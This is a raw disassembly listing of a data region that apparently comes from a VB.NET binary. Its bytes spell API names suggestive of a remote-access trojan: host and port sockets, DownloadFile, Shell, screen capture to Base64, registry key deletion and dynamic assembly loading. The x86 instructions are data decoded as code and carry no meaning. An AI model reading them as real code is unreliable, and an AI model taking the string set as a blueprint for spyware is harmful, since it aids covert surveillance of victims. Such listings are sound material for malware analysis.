  408010:	74 4f                	je     0x408061
  408012:	62 6a 65             	bound  %ebp,0x65(%edx)
  408015:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408019:	75 6d                	jne    0x408088
  40801b:	65 72 61             	gs jb  0x40807f
  40801e:	74 6f                	je     0x40808f
  408020:	72 00                	jb     0x408022
  408022:	67 65 74 5f          	addr16 gs je 0x408085
  408026:	4d                   	dec    %ebp
  408027:	61                   	popa
  408028:	63 68 69             	arpl   %ebp,0x69(%eax)
  40802b:	6e                   	outsb  %ds:(%esi),(%dx)
  40802c:	65 4e                	gs dec %esi
  40802e:	61                   	popa
  40802f:	6d                   	insl   (%dx),%es:(%edi)
  408030:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408034:	74 00                	je     0x408036
  408036:	47                   	inc    %edi
  408037:	65 74 45             	gs je  0x40807f
  40803a:	6e                   	outsb  %ds:(%esi),(%dx)
  40803b:	75 6d                	jne    0x4080aa
  40803d:	65 72 61             	gs jb  0x4080a1
  408040:	74 6f                	je     0x4080b1
  408042:	72 00                	jb     0x408044
  408044:	67 65 74 5f          	addr16 gs je 0x4080a7
  408048:	43                   	inc    %ebx
  408049:	75 72                	jne    0x4080bd
  40804b:	72 65                	jb     0x4080b2
  40804d:	6e                   	outsb  %ds:(%esi),(%dx)
  40804e:	74 00                	je     0x408050
  408050:	67 65 74 5f          	addr16 gs je 0x4080b3
  408054:	49                   	dec    %ecx
  408055:	74 65                	je     0x4080bc
  408057:	6d                   	insl   (%dx),%es:(%edi)
  408058:	00 41 70             	add    %al,0x70(%ecx)
  40805b:	70 65                	jo     0x4080c2
  40805d:	6e                   	outsb  %ds:(%esi),(%dx)
  40805e:	64 00 4d 6f          	add    %cl,%fs:0x6f(%ebp)
  408062:	76 65                	jbe    0x4080c9
  408064:	4e                   	dec    %esi
  408065:	65 78 74             	gs js  0x4080dc
  408068:	00 67 65             	add    %ah,0x65(%edi)
  40806b:	74 5f                	je     0x4080cc
  40806d:	4c                   	dec    %esp
  40806e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408070:	67 74 68             	addr16 je 0x4080db
  408073:	00 53 75             	add    %dl,0x75(%ebx)
  408076:	62 73 74             	bound  %esi,0x74(%ebx)
  408079:	72 69                	jb     0x4080e4
  40807b:	6e                   	outsb  %ds:(%esi),(%dx)
  40807c:	67 00 4f 62          	add    %cl,0x62(%bx)
  408080:	6a 65                	push   $0x65
  408082:	63 74 51 75          	arpl   %esi,0x75(%ecx,%edx,2)
  408086:	65 72 79             	gs jb  0x408102
  408089:	00 4d 61             	add    %cl,0x61(%ebp)
  40808c:	6e                   	outsb  %ds:(%esi),(%dx)
  40808d:	61                   	popa
  40808e:	67 65 6d             	gs insl (%dx),%es:(%di)
  408091:	65 6e                	outsb  %gs:(%esi),(%dx)
  408093:	74 4f                	je     0x4080e4
  408095:	62 6a 65             	bound  %ebp,0x65(%edx)
  408098:	63 74 00 45          	arpl   %esi,0x45(%eax,%eax,1)
  40809c:	6d                   	insl   (%dx),%es:(%edi)
  40809d:	70 74                	jo     0x408113
  40809f:	79 00                	jns    0x4080a1
  4080a1:	43                   	inc    %ebx
  4080a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4080a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4080a4:	63 61 74             	arpl   %esp,0x74(%ecx)
  4080a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4080a9:	61                   	popa
  4080aa:	74 65                	je     0x408111
  4080ac:	4f                   	dec    %edi
  4080ad:	62 6a 65             	bound  %ebp,0x65(%edx)
  4080b0:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  4080b4:	65 72 76             	gs jb  0x40812d
  4080b7:	65 72 43             	gs jb  0x4080fd
  4080ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4080bb:	6d                   	insl   (%dx),%es:(%edi)
  4080bc:	70 75                	jo     0x408133
  4080be:	74 65                	je     0x408125
  4080c0:	72 00                	jb     0x4080c2
  4080c2:	67 65 74 5f          	addr16 gs je 0x408125
  4080c6:	49                   	dec    %ecx
  4080c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4080c8:	66 6f                	outsw  %ds:(%esi),(%dx)
  4080ca:	00 67 65             	add    %ah,0x65(%edi)
  4080cd:	74 5f                	je     0x40812e
  4080cf:	54                   	push   %esp
  4080d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4080d1:	74 61                	je     0x408134
  4080d3:	6c                   	insb   (%dx),%es:(%edi)
  4080d4:	50                   	push   %eax
  4080d5:	68 79 73 69 63       	push   $0x63697379
  4080da:	61                   	popa
  4080db:	6c                   	insb   (%dx),%es:(%edi)
  4080dc:	4d                   	dec    %ebp
  4080dd:	65 6d                	gs insl (%dx),%es:(%edi)
  4080df:	6f                   	outsl  %ds:(%esi),(%dx)
  4080e0:	72 79                	jb     0x40815b
  4080e2:	00 55 49             	add    %dl,0x49(%ebp)
  4080e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4080e6:	74 36                	je     0x40811e
  4080e8:	34 00                	xor    $0x0,%al
  4080ea:	43                   	inc    %ebx
  4080eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4080ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4080ed:	76 65                	jbe    0x408154
  4080ef:	72 73                	jb     0x408164
  4080f1:	69 6f 6e 00 56 61 6c 	imul   $0x6c615600,0x6e(%edi),%ebp
  4080f8:	00 4d 61             	add    %cl,0x61(%ebp)
  4080fb:	74 68                	je     0x408165
  4080fd:	00 52 6f             	add    %dl,0x6f(%edx)
  408100:	75 6e                	jne    0x408170
  408102:	64 00 44 6f 75       	add    %al,%fs:0x75(%edi,%ebp,2)
  408107:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40810b:	52                   	push   %edx
  40810c:	65 6d                	gs insl (%dx),%es:(%edi)
  40810e:	6f                   	outsl  %ds:(%esi),(%dx)
  40810f:	76 65                	jbe    0x408176
  408111:	00 45 6e             	add    %al,0x6e(%ebp)
  408114:	64 52                	fs push %edx
  408116:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40811a:	76 65                	jbe    0x408181
  40811c:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  408120:	72 72                	jb     0x408194
  408122:	61                   	popa
  408123:	79 00                	jns    0x408125
  408125:	54                   	push   %esp
  408126:	6f                   	outsl  %ds:(%esi),(%dx)
  408127:	4c                   	dec    %esp
  408128:	6f                   	outsl  %ds:(%esi),(%dx)
  408129:	6e                   	outsb  %ds:(%esi),(%dx)
  40812a:	67 00 53 74          	add    %dl,0x74(%bp,%di)
  40812e:	72 65                	jb     0x408195
  408130:	61                   	popa
  408131:	6d                   	insl   (%dx),%es:(%edi)
  408132:	00 57 72             	add    %dl,0x72(%edi)
  408135:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  40813c:	00 
  40813d:	57                   	push   %edi
  40813e:	72 69                	jb     0x4081a9
  408140:	74 65                	je     0x4081a7
  408142:	00 50 61             	add    %dl,0x61(%eax)
  408145:	72 61                	jb     0x4081a8
  408147:	6d                   	insl   (%dx),%es:(%edi)
  408148:	65 74 65             	gs je  0x4081b0
  40814b:	72 69                	jb     0x4081b6
  40814d:	7a 65                	jp     0x4081b4
  40814f:	64 54                	fs push %esp
  408151:	68 72 65 61 64       	push   $0x64616572
  408156:	53                   	push   %ebx
  408157:	74 61                	je     0x4081ba
  408159:	72 74                	jb     0x4081cf
  40815b:	00 4e 65             	add    %cl,0x65(%esi)
  40815e:	77 4c                	ja     0x4081ac
  408160:	61                   	popa
  408161:	74 65                	je     0x4081c8
  408163:	42                   	inc    %edx
  408164:	69 6e 64 69 6e 67 00 	imul   $0x676e69,0x64(%esi),%ebp
  40816b:	4c                   	dec    %esp
  40816c:	61                   	popa
  40816d:	74 65                	je     0x4081d4
  40816f:	43                   	inc    %ebx
  408170:	61                   	popa
  408171:	6c                   	insb   (%dx),%es:(%edi)
  408172:	6c                   	insb   (%dx),%es:(%edi)
  408173:	00 4f 62             	add    %cl,0x62(%edi)
  408176:	6a 65                	push   $0x65
  408178:	63 74 46 6c          	arpl   %esi,0x6c(%esi,%eax,2)
  40817c:	6f                   	outsl  %ds:(%esi),(%dx)
  40817d:	77 43                	ja     0x4081c2
  40817f:	6f                   	outsl  %ds:(%esi),(%dx)
  408180:	6e                   	outsb  %ds:(%esi),(%dx)
  408181:	74 72                	je     0x4081f5
  408183:	6f                   	outsl  %ds:(%esi),(%dx)
  408184:	6c                   	insb   (%dx),%es:(%edi)
  408185:	00 43 68             	add    %al,0x68(%ebx)
  408188:	65 63 6b 46          	arpl   %ebp,%gs:0x46(%ebx)
  40818c:	6f                   	outsl  %ds:(%esi),(%dx)
  40818d:	72 53                	jb     0x4081e2
  40818f:	79 6e                	jns    0x4081ff
  408191:	63 4c 6f 63          	arpl   %ecx,0x63(%edi,%ebp,2)
  408195:	6b 4f 6e 56          	imul   $0x56,0x6e(%edi),%ecx
  408199:	61                   	popa
  40819a:	6c                   	insb   (%dx),%es:(%edi)
  40819b:	75 65                	jne    0x408202
  40819d:	54                   	push   %esp
  40819e:	79 70                	jns    0x408210
  4081a0:	65 00 4d 6f          	add    %cl,%gs:0x6f(%ebp)
  4081a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4081a5:	69 74 6f 72 00 45 6e 	imul   $0x746e4500,0x72(%edi,%ebp,2),%esi
  4081ac:	74 
  4081ad:	65 72 00             	gs jb  0x4081b0
  4081b0:	53                   	push   %ebx
  4081b1:	65 6c                	gs insb (%dx),%es:(%edi)
  4081b3:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  4081b8:	64 65 00 50 6f       	fs add %dl,%gs:0x6f(%eax)
  4081bd:	6c                   	insb   (%dx),%es:(%edi)
  4081be:	6c                   	insb   (%dx),%es:(%edi)
  4081bf:	00 42 65             	add    %al,0x65(%edx)
  4081c2:	67 69 6e 53 65 6e 64 	imul   $0x646e65,0x53(%bp),%ebp
  4081c9:	00 
  4081ca:	43                   	inc    %ebx
  4081cb:	6c                   	insb   (%dx),%es:(%edi)
  4081cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cd:	73 65                	jae    0x408234
  4081cf:	00 47 43             	add    %al,0x43(%edi)
  4081d2:	00 43 6f             	add    %al,0x6f(%ebx)
  4081d5:	6c                   	insb   (%dx),%es:(%edi)
  4081d6:	6c                   	insb   (%dx),%es:(%edi)
  4081d7:	65 63 74 00 5f       	arpl   %esi,%gs:0x5f(%eax,%eax,1)
  4081dc:	43                   	inc    %ebx
  4081dd:	6c                   	insb   (%dx),%es:(%edi)
  4081de:	6f                   	outsl  %ds:(%esi),(%dx)
  4081df:	73 75                	jae    0x408256
  4081e1:	72 65                	jb     0x408248
  4081e3:	24 5f                	and    $0x5f,%al
  4081e5:	5f                   	pop    %edi
  4081e6:	31 00                	xor    %eax,(%eax)
  4081e8:	24 56                	and    $0x56,%al
  4081ea:	42                   	inc    %edx
  4081eb:	24 4c                	and    $0x4c,%al
  4081ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ee:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4081f1:	5f                   	pop    %edi
  4081f2:	48                   	dec    %eax
  4081f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4081f4:	73 74                	jae    0x40826a
  4081f6:	00 24 56             	add    %ah,(%esi,%edx,2)
  4081f9:	42                   	inc    %edx
  4081fa:	24 4c                	and    $0x4c,%al
  4081fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4081fd:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408200:	5f                   	pop    %edi
  408201:	50                   	push   %eax
  408202:	6f                   	outsl  %ds:(%esi),(%dx)
  408203:	72 74                	jb     0x408279
  408205:	00 5f 4c             	add    %bl,0x4c(%edi)
  408208:	61                   	popa
  408209:	6d                   	insl   (%dx),%es:(%edi)
  40820a:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  40820e:	5f                   	pop    %edi
  40820f:	5f                   	pop    %edi
  408210:	38 00                	cmp    %al,(%eax)
  408212:	5f                   	pop    %edi
  408213:	4c                   	dec    %esp
  408214:	61                   	popa
  408215:	6d                   	insl   (%dx),%es:(%edi)
  408216:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  40821a:	5f                   	pop    %edi
  40821b:	5f                   	pop    %edi
  40821c:	36 00 5f 4c          	add    %bl,%ss:0x4c(%edi)
  408220:	61                   	popa
  408221:	6d                   	insl   (%dx),%es:(%edi)
  408222:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  408226:	5f                   	pop    %edi
  408227:	5f                   	pop    %edi
  408228:	37                   	aaa
  408229:	00 53 79             	add    %dl,0x79(%ebx)
  40822c:	73 74                	jae    0x4082a2
  40822e:	65 6d                	gs insl (%dx),%es:(%edi)
  408230:	2e 44                	cs inc %esp
  408232:	72 61                	jb     0x408295
  408234:	77 69                	ja     0x40829f
  408236:	6e                   	outsb  %ds:(%esi),(%dx)
  408237:	67 00 47 72          	add    %al,0x72(%bx)
  40823b:	61                   	popa
  40823c:	70 68                	jo     0x4082a6
  40823e:	69 63 73 00 53 69 7a 	imul   $0x7a695300,0x73(%ebx),%esp
  408245:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408249:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  40824d:	67 6c                	insb   (%dx),%es:(%di)
  40824f:	65 00 42 69          	add    %al,%gs:0x69(%edx)
  408253:	74 6d                	je     0x4082c2
  408255:	61                   	popa
  408256:	70 00                	jo     0x408258
  408258:	53                   	push   %ebx
  408259:	74 72                	je     0x4082cd
  40825b:	69 6e 67 73 00 43 6f 	imul   $0x6f430073,0x67(%esi),%ebp
  408262:	6d                   	insl   (%dx),%es:(%edi)
  408263:	70 61                	jo     0x4082c6
  408265:	72 65                	jb     0x4082cc
  408267:	4d                   	dec    %ebp
  408268:	65 74 68             	gs je  0x4082d3
  40826b:	6f                   	outsl  %ds:(%esi),(%dx)
  40826c:	64 00 53 79          	add    %dl,%fs:0x79(%ebx)
  408270:	73 74                	jae    0x4082e6
  408272:	65 6d                	gs insl (%dx),%es:(%edi)
  408274:	2e 57                	cs push %edi
  408276:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  40827d:	46                   	inc    %esi
  40827e:	6f                   	outsl  %ds:(%esi),(%dx)
  40827f:	72 6d                	jb     0x4082ee
  408281:	73 00                	jae    0x408283
  408283:	52                   	push   %edx
  408284:	65 73 74             	gs jae 0x4082fb
  408287:	61                   	popa
  408288:	72 74                	jb     0x4082fe
  40828a:	00 53 6f             	add    %dl,0x6f(%ebx)
  40828d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408290:	74 53                	je     0x4082e5
  408292:	68 75 74 64 6f       	push   $0x6f647475
  408297:	77 6e                	ja     0x408307
  408299:	00 53 68             	add    %dl,0x68(%ebx)
  40829c:	75 74                	jne    0x408312
  40829e:	64 6f                	outsl  %fs:(%esi),(%dx)
  4082a0:	77 6e                	ja     0x408310
  4082a2:	00 43 6f             	add    %al,0x6f(%ebx)
  4082a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4082a6:	76 65                	jbe    0x40830d
  4082a8:	72 74                	jb     0x40831e
  4082aa:	00 46 72             	add    %al,0x72(%esi)
  4082ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ae:	6d                   	insl   (%dx),%es:(%edi)
  4082af:	42                   	inc    %edx
  4082b0:	61                   	popa
  4082b1:	73 65                	jae    0x408318
  4082b3:	36 34 53             	ss xor $0x53,%al
  4082b6:	74 72                	je     0x40832a
  4082b8:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4082bf:	54                   	push   %esp
  4082c0:	65 6d                	gs insl (%dx),%es:(%edi)
  4082c2:	70 50                	jo     0x408314
  4082c4:	61                   	popa
  4082c5:	74 68                	je     0x40832f
  4082c7:	00 43 6f             	add    %al,0x6f(%ebx)
  4082ca:	6d                   	insl   (%dx),%es:(%edi)
  4082cb:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  4082ce:	65 00 44 6f 77       	add    %al,%gs:0x77(%edi,%ebp,2)
  4082d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4082d4:	6c                   	insb   (%dx),%es:(%edi)
  4082d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4082d6:	61                   	popa
  4082d7:	64 46                	fs inc %esi
  4082d9:	69 6c 65 00 50 72 6f 	imul   $0x636f7250,0x0(%ebp,%eiz,2),%ebp
  4082e0:	63 
  4082e1:	65 73 73             	gs jae 0x408357
  4082e4:	00 41 70             	add    %al,0x70(%ecx)
  4082e7:	70 57                	jo     0x408340
  4082e9:	69 6e 53 74 79 6c 65 	imul   $0x656c7974,0x53(%esi),%ebp
  4082f0:	00 53 68             	add    %dl,0x68(%ebx)
  4082f3:	65 6c                	gs insb (%dx),%es:(%edi)
  4082f5:	6c                   	insb   (%dx),%es:(%edi)
  4082f6:	00 41 62             	add    %al,0x62(%ecx)
  4082f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4082fa:	72 74                	jb     0x408370
  4082fc:	00 53 70             	add    %dl,0x70(%ebx)
  4082ff:	65 63 69 61          	arpl   %ebp,%gs:0x61(%ecx)
  408303:	6c                   	insb   (%dx),%es:(%edi)
  408304:	46                   	inc    %esi
  408305:	6f                   	outsl  %ds:(%esi),(%dx)
  408306:	6c                   	insb   (%dx),%es:(%edi)
  408307:	64 65 72 00          	fs gs jb 0x40830b
  40830b:	47                   	inc    %edi
  40830c:	65 74 46             	gs je  0x408355
  40830f:	6f                   	outsl  %ds:(%esi),(%dx)
  408310:	6c                   	insb   (%dx),%es:(%edi)
  408311:	64 65 72 50          	fs gs jb 0x408365
  408315:	61                   	popa
  408316:	74 68                	je     0x408380
  408318:	00 46 69             	add    %al,0x69(%esi)
  40831b:	6c                   	insb   (%dx),%es:(%edi)
  40831c:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408320:	61                   	popa
  408321:	64 41                	fs inc %ecx
  408323:	6c                   	insb   (%dx),%es:(%edi)
  408324:	6c                   	insb   (%dx),%es:(%edi)
  408325:	54                   	push   %esp
  408326:	65 78 74             	gs js  0x40839d
  408329:	00 57 72             	add    %dl,0x72(%edi)
  40832c:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  408333:	65 
  408334:	78 74                	js     0x4083aa
  408336:	00 67 65             	add    %ah,0x65(%edi)
  408339:	74 5f                	je     0x40839a
  40833b:	4d                   	dec    %ebp
  40833c:	65 73 73             	gs jae 0x4083b2
  40833f:	61                   	popa
  408340:	67 65 00 4d 69       	add    %cl,%gs:0x69(%di)
  408345:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408348:	73 6f                	jae    0x4083b9
  40834a:	66 74 2e             	data16 je 0x40837b
  40834d:	56                   	push   %esi
  40834e:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408355:	73 69                	jae    0x4083c0
  408357:	63 2e                	arpl   %ebp,(%esi)
  408359:	4d                   	dec    %ebp
  40835a:	79 53                	jns    0x4083af
  40835c:	65 72 76             	gs jb  0x4083d5
  40835f:	69 63 65 73 00 52 65 	imul   $0x65520073,0x65(%ebx),%esp
  408366:	67 69 73 74 72 79 50 	imul   $0x72507972,0x74(%bp,%di),%esi
  40836d:	72 
  40836e:	6f                   	outsl  %ds:(%esi),(%dx)
  40836f:	78 79                	js     0x4083ea
  408371:	00 67 65             	add    %ah,0x65(%edi)
  408374:	74 5f                	je     0x4083d5
  408376:	52                   	push   %edx
  408377:	65 67 69 73 74 72 79 	imul   $0x4d007972,%gs:0x74(%bp,%di),%esi
  40837e:	00 4d 
  408380:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408387:	74 2e                	je     0x4083b7
  408389:	57                   	push   %edi
  40838a:	69 6e 33 32 00 52 65 	imul   $0x65520032,0x33(%esi),%ebp
  408391:	67 69 73 74 72 79 4b 	imul   $0x654b7972,0x74(%bp,%di),%esi
  408398:	65 
  408399:	79 00                	jns    0x40839b
  40839b:	67 65 74 5f          	addr16 gs je 0x4083fe
  40839f:	43                   	inc    %ebx
  4083a0:	75 72                	jne    0x408414
  4083a2:	72 65                	jb     0x408409
  4083a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a5:	74 55                	je     0x4083fc
  4083a7:	73 65                	jae    0x40840e
  4083a9:	72 00                	jb     0x4083ab
  4083ab:	44                   	inc    %esp
  4083ac:	65 6c                	gs insb (%dx),%es:(%edi)
  4083ae:	65 74 65             	gs je  0x408416
  4083b1:	53                   	push   %ebx
  4083b2:	75 62                	jne    0x408416
  4083b4:	4b                   	dec    %ebx
  4083b5:	65 79 00             	gs jns 0x4083b8
  4083b8:	53                   	push   %ebx
  4083b9:	63 72 65             	arpl   %esi,0x65(%edx)
  4083bc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4083be:	00 67 65             	add    %ah,0x65(%edi)
  4083c1:	74 5f                	je     0x408422
  4083c3:	50                   	push   %eax
  4083c4:	72 69                	jb     0x40842f
  4083c6:	6d                   	insl   (%dx),%es:(%edi)
  4083c7:	61                   	popa
  4083c8:	72 79                	jb     0x408443
  4083ca:	53                   	push   %ebx
  4083cb:	63 72 65             	arpl   %esi,0x65(%edx)
  4083ce:	65 6e                	outsb  %gs:(%esi),(%dx)
  4083d0:	00 67 65             	add    %ah,0x65(%edi)
  4083d3:	74 5f                	je     0x408434
  4083d5:	42                   	inc    %edx
  4083d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4083d7:	75 6e                	jne    0x408447
  4083d9:	64 73 00             	fs jae 0x4083dc
  4083dc:	67 65 74 5f          	addr16 gs je 0x40843f
  4083e0:	57                   	push   %edi
  4083e1:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
  4083e8:	74 
  4083e9:	5f                   	pop    %edi
  4083ea:	48                   	dec    %eax
  4083eb:	65 69 67 68 74 00 53 	imul   $0x79530074,%gs:0x68(%edi),%esp
  4083f2:	79 
  4083f3:	73 74                	jae    0x408469
  4083f5:	65 6d                	gs insl (%dx),%es:(%edi)
  4083f7:	2e 44                	cs inc %esp
  4083f9:	72 61                	jb     0x40845c
  4083fb:	77 69                	ja     0x408466
  4083fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4083fe:	67 2e 49             	addr16 cs dec %ecx
  408401:	6d                   	insl   (%dx),%es:(%edi)
  408402:	61                   	popa
  408403:	67 69 6e 67 00 50 69 	imul   $0x78695000,0x67(%bp),%ebp
  40840a:	78 
  40840b:	65 6c                	gs insb (%dx),%es:(%edi)
  40840d:	46                   	inc    %esi
  40840e:	6f                   	outsl  %ds:(%esi),(%dx)
  40840f:	72 6d                	jb     0x40847e
  408411:	61                   	popa
  408412:	74 00                	je     0x408414
  408414:	49                   	dec    %ecx
  408415:	6d                   	insl   (%dx),%es:(%edi)
  408416:	61                   	popa
  408417:	67 65 00 46 72       	add    %al,%gs:0x72(%bp)
  40841c:	6f                   	outsl  %ds:(%esi),(%dx)
  40841d:	6d                   	insl   (%dx),%es:(%edi)
  40841e:	49                   	dec    %ecx
  40841f:	6d                   	insl   (%dx),%es:(%edi)
  408420:	61                   	popa
  408421:	67 65 00 43 6f       	add    %al,%gs:0x6f(%bp,%di)
  408426:	70 79                	jo     0x4084a1
  408428:	50                   	push   %eax
  408429:	69 78 65 6c 4f 70 65 	imul   $0x65704f6c,0x65(%eax),%edi
  408430:	72 61                	jb     0x408493
  408432:	74 69                	je     0x40849d
  408434:	6f                   	outsl  %ds:(%esi),(%dx)
  408435:	6e                   	outsb  %ds:(%esi),(%dx)
  408436:	00 43 6f             	add    %al,0x6f(%ebx)
  408439:	70 79                	jo     0x4084b4
  40843b:	46                   	inc    %esi
  40843c:	72 6f                	jb     0x4084ad
  40843e:	6d                   	insl   (%dx),%es:(%edi)
  40843f:	53                   	push   %ebx
  408440:	63 72 65             	arpl   %esi,0x65(%edx)
  408443:	65 6e                	outsb  %gs:(%esi),(%dx)
  408445:	00 47 72             	add    %al,0x72(%edi)
  408448:	61                   	popa
  408449:	70 68                	jo     0x4084b3
  40844b:	69 63 73 55 6e 69 74 	imul   $0x74696e55,0x73(%ebx),%esp
  408452:	00 44 72 61          	add    %al,0x61(%edx,%esi,2)
  408456:	77 49                	ja     0x4084a1
  408458:	6d                   	insl   (%dx),%es:(%edi)
  408459:	61                   	popa
  40845a:	67 65 00 49 6d       	add    %cl,%gs:0x6d(%bx,%di)
  40845f:	61                   	popa
  408460:	67 65 46             	addr16 gs inc %esi
  408463:	6f                   	outsl  %ds:(%esi),(%dx)
  408464:	72 6d                	jb     0x4084d3
  408466:	61                   	popa
  408467:	74 00                	je     0x408469
  408469:	67 65 74 5f          	addr16 gs je 0x4084cc
  40846d:	4a                   	dec    %edx
  40846e:	70 65                	jo     0x4084d5
  408470:	67 00 53 61          	add    %dl,0x61(%bp,%di)
  408474:	76 65                	jbe    0x4084db
  408476:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40847a:	61                   	popa
  40847b:	73 65                	jae    0x4084e2
  40847d:	36 34 53             	ss xor $0x53,%al
  408480:	74 72                	je     0x4084f4
  408482:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408489:	74 65                	je     0x4084f0
  40848b:	6d                   	insl   (%dx),%es:(%edi)
  40848c:	2e 52                	cs push %edx
  40848e:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408491:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408496:	6e                   	outsb  %ds:(%esi),(%dx)
  408497:	00 4d 65             	add    %cl,0x65(%ebp)
  40849a:	74 68                	je     0x408504
  40849c:	6f                   	outsl  %ds:(%esi),(%dx)
  40849d:	64 49                	fs dec %ecx
  40849f:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a0:	66 6f                	outsw  %ds:(%esi),(%dx)
  4084a2:	00 41 70             	add    %al,0x70(%ecx)
  4084a5:	70 44                	jo     0x4084eb
  4084a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4084a8:	6d                   	insl   (%dx),%es:(%edi)
  4084a9:	61                   	popa
  4084aa:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4084b1:	43                   	inc    %ebx
  4084b2:	75 72                	jne    0x408526
  4084b4:	72 65                	jb     0x40851b
  4084b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4084b7:	74 44                	je     0x4084fd
  4084b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ba:	6d                   	insl   (%dx),%es:(%edi)
  4084bb:	61                   	popa
  4084bc:	69 6e 00 41 73 73 65 	imul   $0x65737341,0x0(%esi),%ebp
  4084c3:	6d                   	insl   (%dx),%es:(%edi)
  4084c4:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4084c8:	4c                   	dec    %esp
  4084c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ca:	61                   	popa
  4084cb:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  4084cf:	74 54                	je     0x408525
  4084d1:	79 70                	jns    0x408543
  4084d3:	65 73 00             	gs jae 0x4084d6
  4084d6:	4d                   	dec    %ebp
  4084d7:	65 6d                	gs insl (%dx),%es:(%edi)
  4084d9:	62 65 72             	bound  %esp,0x72(%ebp)
  4084dc:	49                   	dec    %ecx
  4084dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4084de:	66 6f                	outsw  %ds:(%esi),(%dx)
  4084e0:	00 67 65             	add    %ah,0x65(%edi)
  4084e3:	74 5f                	je     0x408544
  4084e5:	4e                   	dec    %esi
  4084e6:	61                   	popa
  4084e7:	6d                   	insl   (%dx),%es:(%edi)
  4084e8:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4084ec:	74 4d                	je     0x40853b
  4084ee:	65 74 68             	gs je  0x408559
  4084f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f2:	64 73 00             	fs jae 0x4084f5
  4084f5:	4c                   	dec    %esp
  4084f6:	61                   	popa
  4084f7:	74 65                	je     0x40855e
  4084f9:	47                   	inc    %edi
  4084fa:	65 74 00             	gs je  0x4084fd
  4084fd:	43                   	inc    %ebx
  4084fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408500:	64 69 74 69 6f 6e 61 	imul   $0x436c616e,%fs:0x6f(%ecx,%ebp,2),%esi
  408507:	6c 43 
  408509:	6f                   	outsl  %ds:(%esi),(%dx)
  40850a:	6d                   	insl   (%dx),%es:(%edi)
  40850b:	70 61                	jo     0x40856e
  40850d:	72 65                	jb     0x408574
  40850f:	4f                   	dec    %edi
  408510:	62 6a 65             	bound  %ebp,0x65(%edx)
  408513:	63 74 45 71          	arpl   %esi,0x71(%ebp,%eax,2)
  408517:	75 61                	jne    0x40857a
  408519:	6c                   	insb   (%dx),%es:(%edi)
  40851a:	00 54 6f 49          	add    %dl,0x49(%edi,%ebp,2)
  40851e:	6e                   	outsb  %ds:(%esi),(%dx)
  40851f:	74 33                	je     0x408554
  408521:	32 00                	xor    (%eax),%al
  408523:	49                   	dec    %ecx
  408524:	6e                   	outsb  %ds:(%esi),(%dx)
  408525:	74 33                	je     0x40855a
  408527:	32 00                	xor    (%eax),%al
  408529:	53                   	push   %ebx
  40852a:	74 61                	je     0x40858d
  40852c:	72 74                	jb     0x4085a2
